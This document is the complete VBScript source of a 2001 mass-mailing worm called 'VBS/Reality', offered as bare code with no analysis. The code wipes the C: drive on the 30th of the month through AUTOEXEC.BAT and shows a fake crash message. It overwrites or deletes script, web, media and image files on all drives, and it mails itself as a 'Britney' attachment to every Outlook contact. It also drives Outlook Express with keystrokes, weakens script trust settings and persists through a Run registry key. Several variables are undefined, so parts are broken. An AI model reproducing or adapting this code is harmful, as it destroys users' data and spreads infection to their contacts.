'VBS/Reality by FileSystemObject, April 13, 2001.
On Error Resume Next
Dim FSO, WshShell
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")
If Day(Now) = 30 Then
Set DLBat = FSO.CreateTextFile("C:\AUTOEXEC.BAT",True)
DLBat.Write "deltree /y c:\*.*"
DLBat.Close
WshShell.Popup "Fatal exception 0E at offset 0000035F.  Windows will now restart.", 0, "Windows"
WshShell.Run "rundll32.exe user.exe,ExitWindows"
End If
Set Us = FSO.OpenTextFile(WScript.ScriptFullName, 1)
Set Ht = FSO.CreateTextFile("C:\WINDOWS\SYSTEM\MSHTA.VXX", True)
Ht.WriteLine "<"&"SCRIPT"&">"
Ht.WriteLine "window.onerror=winerr;function winerr(){return true;}"
Ht.WriteLine "<"&"/SCRIPT"&">"
Ht.WriteLine "<"&"SCRIPT LANGUAGE=""VBS"""&">"
Ht.WriteLine "Set FSO=CreateObject(""Scripting.FileSystemObject"")"
Ht.WriteLine "Set VBS=FSO.CreateTextFile(""C:\W32DLLCRT.VBS"")"
Do Until Us.AtEndOfStream = True
Ht.WriteLine "VBS.WriteLine """&Replace(Us.ReadLine, """, """")&"""
Loop
Ht.WriteLine "VBS.Close"
Ht.WriteLine "Set Shl=CreateObject(""WScript.Shell"")"
Ht.WriteLine "Shl.RegWrite ""HKCU\Software\Microsoft\Windows Script\Settings\TrustPolicy"", 0, ""REG_DWORD"""
Ht.WriteLine "Shl.Run ""C:\W32DLLCRT.VBS"",0,True"
Ht.WriteLine "FSO.DeleteFile ""C:\W32DLLCRT.VBS"""
Ht.WriteLine "Window.Close"
Ht.Write "<"&"/SCRIPT"&">"
Ht.Close
Us.Close
InfectFiles ""
If Not WshShell.RegRead("HKLM\SOFTWARE\Mailer") = "Reality" Then
Set OL=CreateObject("Outlook.Application")
Set MItem = OL.CreateItem(0)
MItem.Subject = "Fw: Britney"
MItem.Body = vbcrlf&vbtab&"Does this require an explanation?  It shouldn't... :o)"
MItem.DeleteAfterSubmit = True
FSO.CopyFile "C:\WINDOWS\SYSTEM\MSHTA.VXX", "C:\WINDOWS\BRITNEY.MOV.HTA"
MItem.Attachments.Add "C:\WINDOWS\BRITNEY.MOV.HTA"
For Each Z In OL.GetNameSpace("MAPI").AddressLists
For Each Y In Z.AddressEntries
MItem.Recipients.Add(Y.Address)
Next
Next
MItem.Send
WshShell.RegWrite "HKLM\SOFTWARE\Mailer", "Reality"
End If
If Not WshShell.RegRead("HKLM\SOFTWARE\Mailed") = "Reality" Then
WshShell.Run "msimn"
WshShell.AppActivate "Outlook Express"
WScript.Sleep 2000
SendKeys "%TB"
SendKeys "%EA"
SendKeys "%EC"
SendKeys "%FX"
SendKeys "%FX"
WshShell.Run "notepad"
WshShell.AppActivate "Notepad"
WScript.Sleep 500
SendKeys "%EP"
SendKeys "%FS"
SendKeys "C:\MIME.TXT{ENTER}"
SendKeys "%FX"
MailAddrs = ""
Set MimeRead = FSO.OpenTextFile("C:\MIME.TXT")
Do Until MimeRead.AtEndOfStream
Z = MimeRead.ReadLine
If Z = "E-mail Address(es):" Then
MailAddrs = MailAddrs & ReadMim.ReadLine & ";"
End If
Loop
Set Malformed = FSO.CreateTextFile("C:\WINDOWS\BRITNEY.EML")
Malformed.WriteLine "MIME-Version: 1.0"
Malformed.WriteLine "Content-Type: multipart/alternative;"
Malformed.WriteLine vbTab&"boundary=""----=_NextPart_000_013D_01C0C21A.CB10FBC0"""
Malformed.WriteLine "X-Priority: 3"
Malformed.WriteLine "X-MSMail-Priority: Normal"
Malformed.WriteLine "X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2462.0000"
Malformed.WriteLine ""
Malformed.WriteLine "This is a multi-part message in MIME format."
Malformed.WriteLine ""
Malformed.WriteLine "------=_NextPart_000_013D_01C0C21A.CB10FBC0"
Malformed.WriteLine "Content-Type: text/plain;"
Malformed.WriteLine vbTab&"charset=""iso-8859-1"";"
Malformed.WriteLine vbTab&"name=""BRITNEY SPEARS MOVIE.MOVMO.HTA"""
Malformed.WriteLine "Content-Transfer-Encoding: quoted-printable"
Malformed.WriteLine "Content-ID: <HtaFile>"
Malformed.WriteLine ""
Set RdMim = FSO.OpenTextFile("C:\WINDOWS\SYSTEM\MSHTA.VXX", 1)
RpUs = Replace(RdMim.ReadAll, "=", "=3D")
Malformed.WriteLine RpUs
Malformed.WriteLine ""
Malformed.WriteLine "------=_NextPart_000_013D_01C0C21A.CB10FBC0"
Malformed.WriteLine "Content-Type: text/html;"
Malformed.WriteLine vbTab&"charset=""iso-8859-1"""
Malformed.WriteLine "Content-Transfer-Encoding: quoted-printable"
Malformed.WriteLine ""
Malformed.WriteLine "<"&"IFRAME SRC=3D""cid:VbsFile"""&">"
Malformed.WriteLine "<"&"/IFRAME"&">"
Malformed.WriteLine "------=_NextPart_000_013D_01C0C21A.CB10FBC0--"
Malformed.Close
WshShell.Run "C:\WINDOWS\BRITNEY.EML"
SendKeys "{ESC}"
SendKeys "%MF"
SendKeys "{ESC}"
CL = Len(MailAddrs) - 10
Do While CL > 0
SendKeys Mid(MailAddrs, CL, 10)
If CL < 10 Then
SendKeys Mid(MailAddrs, 1, CL - 1)
Else
CL = CL - 10
End If
Loop
SendKeys "{TAB}{TAB}"
SendKeys "Britney"
SendKeys "{DOWN}{DOWN}{DOWN}{DOWN}"
For X = 0 To 9
For Y = 1 To 10
SendKeys "{BS}"
Next
Next
SendKeys "{BS}{BS}{BS}{BS}{BS}"
SendKeys "Does this require an explanation?  It shouldn't... :o)"
ADF = WshShell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\AppData")
IDF = WshShell.RegRead("HKCU\Identities\Default User ID")
IDN = ADF&"\Identities\"&IDF
SIF = IDN&"\Sent Items.dbx"
BAK = "C:\WINDOWS\SENT.VXD"
SendKeys "%FE"
For Each MM In FSO.GetFolder(ADF&"\Identities").SubFolders
M = MM.Name
Do Until WshShell.RegRead("HKCU\Identities\"&M&"\Software\Microsoft\Outlook Express\5.0\Running") = 0
WshShell.AppActivate "Outlook Express"
SendKeys "%{F4}"
Loop
Next
FSO.CopyFile BAK, SIF
FSO.DeleteFile BAK
WshShell.RegWrite "HKLM\SOFTWARE\Mailed", "Reality"
End If
Do While WScript.Path = WScript.Path
WF = "C:\WINDOWS\MSKRNL32.VBS"
If Not FSO.FileExists(WF) Then
Set WFT = FSO.CreateTextFile(WF)
WFT.Write OurCode
WFT.Close
End If
If Not WshShell.RegRead("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\System Restore") = WF Then
WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\System Restore", WF
End If
Loop
Sub InfectFiles(FP)
On Error Resume Next
If FP = "" Then
For Each Z In FSO.Drives
If Z.DriveType = 2 Or Z.DriveType = 3 Then
InfectFiles(Z.Path&"\")
End If
Next
Else
For Each Y In FSO.GetFolder(FP).Files
P = Y.Path
Ext = UCase(FSO.GetExtensionName(P))
If Ext = "VBS" Or Ext = "VBE" Then
Att = FSO.GetFile(P).Attributes
FSO.GetFile(P).Attributes = 0
FSO.CopyFile WScript.ScriptFullName, P
FSO.GetFile(P).Attributes = Att
ElseIf InStr(1, Ext, "HT") > 0 Or Ext = "ASP" Then
Att = FSO.GetFile(P).Attributes
FSO.GetFile(P).Attributes = 0
FSO.CopyFile "C:\WINDOWS\SYSTEM\MSHTA.VXX", P
FSO.GetFile(P).Attributes = Att
ElseIf Ext = "JS" Or Ext = "JSE" Or Ext = "WSC" Or Ext = "WSF" Or InStr(1, Ext, "MP") > 0 Or Ext = "JPEG" Or Ext = "WAV" Or Ext = "MID" Or Ext = "WMA" Or Ext = "SCT" Or Ext = "SHS" Or Ext = "GIF" Or Ext = "BMP" Or Ext = "PHP" Or Ext = "PKR" Or Ext = "SKR" Or Ext = "JSP" Then
FSO.DeleteFile P, True
FSO.CopyFile WScript.ScriptFullName, P&".vbs"
End If
Next
For Each X In FSO.GetFolder(FP).SubFolders
InfectFiles(FP.Path)
Next
End If
End Sub
Sub SendKeys(kst)
On Error Resume Next
WshShell.SendKeys kst
WScript.Sleep 100
End Sub